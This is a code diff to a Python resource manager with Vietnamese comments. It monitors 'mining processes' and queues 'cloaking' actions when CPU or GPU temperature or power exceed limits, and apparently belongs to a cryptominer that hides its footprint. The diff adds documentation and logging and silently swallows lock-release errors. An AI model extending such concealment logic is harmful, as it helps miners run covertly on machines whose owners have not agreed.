@@ -14,7 +14,7 @@ import traceback
 import threading
 import queue
 import time
-
+from threading import RLock
 from typing import List, Any, Dict, Optional, Tuple
 from itertools import count
 
@@ -293,7 +293,7 @@ class ResourceManager(IResourceManager):
         self._stop_flag = False
 
         # Lock đồng bộ
-        self.mining_processes_lock = threading.RLock()
+        self.mining_processes_lock = threading.RLock()  # Sử dụng trực tiếp threading.RLock
         self.mining_processes: List[MiningProcess] = []
 
         # Queue để điều chỉnh tài nguyên
@@ -588,39 +588,56 @@ class ResourceManager(IResourceManager):
 
     def monitor_watcher(self):
         """
-        Gộp hai watcher (temperature & power) trong cùng một vòng lặp.
-        Mỗi chu kỳ sẽ:
-        1) discover_mining_processes
-        2) Kiểm tra nhiệt độ -> enqueue cloaking nếu quá
-        3) Kiểm tra công suất -> enqueue cloaking nếu quá
+        Giám sát nhiệt độ và công suất tiêu thụ của hệ thống, gộp hai watcher 
+        (temperature & power) trong một vòng lặp duy nhất.
+        
+        Mỗi chu kỳ thực hiện:
+        1) Khám phá các tiến trình khai thác (discover_mining_processes).
+        2) Kiểm tra nhiệt độ CPU/GPU -> Nếu vượt ngưỡng, thêm yêu cầu cloaking.
+        3) Kiểm tra công suất CPU/GPU -> Nếu vượt ngưỡng, thêm yêu cầu cloaking.
+
+        Chạy định kỳ theo thời gian cấu hình.
+
+        Attributes:
+            self.config: Đối tượng cấu hình chứa các ngưỡng nhiệt độ và công suất.
+            self.logger: Logger để ghi log trạng thái và lỗi.
+            self._stop_flag: Biến cờ dừng vòng lặp khi ResourceManager dừng hoạt động.
         """
+        # Lấy tham số chu kỳ kiểm tra từ cấu hình
         mon_params = self.config.monitoring_parameters
         interval = mon_params.get("temperature_monitoring_interval_seconds", 60)
 
-        # Ngưỡng nhiệt độ
+        # Ngưỡng nhiệt độ từ cấu hình
         temp_lims = self.config.temperature_limits
-        cpu_max_temp = temp_lims.get("cpu_max_celsius", 75)
-        gpu_max_temp = temp_lims.get("gpu_max_celsius", 85)
+        cpu_max_temp = temp_lims.get("cpu_max_celsius", 75)  # Nhiệt độ tối đa CPU (°C)
+        gpu_max_temp = temp_lims.get("gpu_max_celsius", 85)  # Nhiệt độ tối đa GPU (°C)
 
-        # Ngưỡng công suất
+        # Ngưỡng công suất từ cấu hình
         power_lims = self.config.power_limits
         per_dev_power = power_lims.get("per_device_power_watts", {})
-        cpu_max_pwr = per_dev_power.get("cpu", 150)
-        gpu_max_pwr = per_dev_power.get("gpu", 300)
+        cpu_max_pwr = per_dev_power.get("cpu", 150)  # Công suất tối đa CPU (W)
+        gpu_max_pwr = per_dev_power.get("gpu", 300)  # Công suất tối đa GPU (W)
 
+        # Vòng lặp giám sát
         while not self._stop_flag:
             try:
+                # 1. Khám phá các tiến trình khai thác
+                self.logger.debug("Bắt đầu khám phá tiến trình khai thác.")
                 self.discover_mining_processes()
 
-                # Check nhiệt độ
+                # 2. Kiểm tra nhiệt độ của CPU và GPU
+                self.logger.debug("Bắt đầu kiểm tra nhiệt độ.")
                 self.check_temperature_all(cpu_max_temp, gpu_max_temp)
 
-                # Check power
+                # 3. Kiểm tra công suất tiêu thụ của CPU và GPU
+                self.logger.debug("Bắt đầu kiểm tra công suất.")
                 self.check_power_all(cpu_max_pwr, gpu_max_pwr)
 
             except Exception as e:
-                self.logger.error(f"Lỗi monitor_watcher: {e}")
+                # Log lỗi nếu có ngoại lệ
+                self.logger.error(f"Lỗi không mong muốn trong monitor_watcher: {e}\n{traceback.format_exc()}")
 
+            # Tạm dừng trước khi lặp lại chu kỳ
             time.sleep(interval)
 
     def discover_mining_processes(self):
@@ -657,8 +674,10 @@ class ResourceManager(IResourceManager):
         except Exception as e:
             self.logger.error(f"Lỗi discover_mining_processes: {e}\n{traceback.format_exc()}")
         finally:
-            if self.mining_processes_lock.locked():
+            try:
                 self.mining_processes_lock.release()
+            except RuntimeError:
+                pass
 
     def get_process_priority(self, process_name: str) -> int:
         """
@@ -786,7 +805,7 @@ class ResourceManager(IResourceManager):
         except Exception as e:
             self.logger.error(f"Lỗi khi khôi phục tài nguyên: {e}")
         finally:
-            if self.mining_processes_lock.locked():
+            try:
                 self.mining_processes_lock.release()
-
-        self.logger.info("ResourceManager đã dừng. (KẾT THÚC)")
+            except RuntimeError:
+                pass
